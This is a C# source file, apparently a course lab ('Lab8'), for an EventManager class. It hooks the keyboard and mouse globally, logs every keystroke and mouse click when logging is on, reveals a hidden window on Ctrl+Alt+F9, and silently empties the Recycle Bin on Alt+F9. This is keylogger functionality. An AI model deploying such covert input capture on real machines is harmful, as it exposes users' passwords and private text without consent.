using Gma.System.MouseKeyHook;
using System.Windows.Forms;
using System.Diagnostics;
using System.Globalization;
using System.Runtime.InteropServices;
using System;

namespace Lab8
{
    public class EventManager
    {
        public delegate void WindowShowHandler();

        private readonly IKeyboardMouseEvents _globalHooks = Hook.GlobalEvents();
        private readonly LogManager _logManager;
        private readonly Settings _settings;
        private readonly WindowShowHandler _windowShow;

        //Когда операция закончится, не пригрывать звук
        const int SHERB_NOSOUND = 0x00000004;

        //API-функция очистки корзины
        [DllImport("shell32.dll")]
        static extern int SHEmptyRecycleBin(IntPtr hWnd, string pszRootPath, uint dwFlags);

        public EventManager(Settings config, WindowShowHandler windowShow)
        {
            _settings = config;
            _windowShow = windowShow;
            _logManager = new LogManager(_settings);
            _globalHooks.KeyDown += KeyEvent;
            _globalHooks.MouseClick += MouseEvent;
        }

        private void KeyEvent(object sender, KeyEventArgs e)
        {
            if (_settings.IsHotKey)
            {
                if (e.KeyData == (Keys.Alt | Keys.F9))
                {
                    SHEmptyRecycleBin(IntPtr.Zero, "", SHERB_NOSOUND);
                }
            }
            if(_settings.IsLog)
                _logManager.KeyLogManager(e.KeyData.ToString());
            if (e.KeyData == (Keys.Control | Keys.Alt | Keys.F9))
            {
                if (_windowShow != null)
                {
                    _windowShow.Invoke();
                }
            }
        }

        private void MouseEvent(object sender, MouseEventArgs e)
        {
            if (_settings.IsLog)
            {
                _logManager.MouseLogManager(e.Button.ToString(), e.Location.ToString());
            }
        }
    }
}